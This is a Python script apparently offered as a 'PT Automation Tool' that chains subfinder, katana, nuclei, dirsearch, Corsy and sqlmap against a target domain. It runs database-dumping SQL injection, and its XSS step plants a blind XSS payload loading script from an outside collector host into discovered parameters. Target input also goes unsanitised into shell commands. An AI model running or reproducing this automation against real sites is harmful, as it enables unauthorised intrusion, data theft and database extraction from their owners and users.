import os
import sys
import argparse

def enum_subdomains(target):
    os.system(f"subfinder -d {target} -all -recursive > {target}-subdomain.txt")
    os.system(f"cat {target}-subdomain.txt | /root/go/bin/httpx -silent -threads 200 > {target}-subdomains_alive.txt")
    os.system(f"katana -u {target}-subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o {target}-allurls.txt")
    os.system(f"cat {target}-allurls.txt | grep -E \".txt|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.json|\\.gz|\\.rar|\\.zip|\\.config|\\.js$\" >> {target}-sensitive.txt")
    os.system(f"cat {target}-sensitive.txt | nuclei -t exposures")
    os.system(f"echo {target} | katana -ps | grep -E \".js$\" | nuclei -t exposures -c 30")

def fuzzing(target):
    os.system(f"/home/directory/dirsearch/dirsearch.py -u https://{target} -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json -o dirsearch-{target}.txt")

def xss_finding(target):
    os.system(f"subfinder -d {target} | /root/go/bin/httpx -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload \'><script src=https://xss.report/c/coffinxp></script>' -parameters")

def lfi_finding(target):
    os.system(f"cat {target}-allurls.txt | gf lfi | nuclei -tags lfi")

def cors_finding(target):
    os.system(f"python3 /home/directory/Corsy/corsy.py -i {target}-subdomains_alive.txt -t 10 --headers \"User-Agent: GoogleBot\nCookie: SESSION=Hacked\"")

def vulnerability_scan(target):
    os.system(f"nuclei -list {target}-subdomains_alive.txt -tags cve,osint,tech")

def sql_injection(target):
    os.system(f"cat {target} | gau | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent | tee -a sqli.txt")

def main():
    parser = argparse.ArgumentParser(description="PT Automation Tool")
    parser.add_argument("target", help="Target domain")
    parser.add_argument("-e", "--enum", action="store_true", help="Perform enumeration")
    parser.add_argument("-f", "--fuzz", action="store_true", help="Perform fuzzing")
    parser.add_argument("-x", "--xss", action="store_true", help="Perform XSS finding")
    parser.add_argument("-l", "--lfi", action="store_true", help="Perform LFI finding")
    parser.add_argument("-c", "--cors", action="store_true", help="Perform CORS finding")
    parser.add_argument("-v", "--vuln", action="store_true", help="Perform vulnerability scan")
    parser.add_argument("-s", "--sql", action="store_true", help="Perform SQL injection")
    parser.add_argument("-a", "--all", action="store_true", help="Perform all tasks")
    args = parser.parse_args()

    if args.all:
        enum_subdomains(args.target)
        fuzzing(args.target)
        xss_finding(args.target)
        lfi_finding(args.target)
        cors_finding(args.target)
        vulnerability_scan(args.target)
        sql_injection(args.target)
    else:
        if args.enum:
            enum_subdomains(args.target)
        if args.fuzz:
            fuzzing(args.target)
        if args.xss:
            xss_finding(args.target)
        if args.lfi:
            lfi_finding(args.target)
        if args.cors:
            cors_finding(args.target)
        if args.vuln:
            vulnerability_scan(args.target)
        if args.sql:
            sql_injection(args.target)

if __name__ == "__main__":
    main()
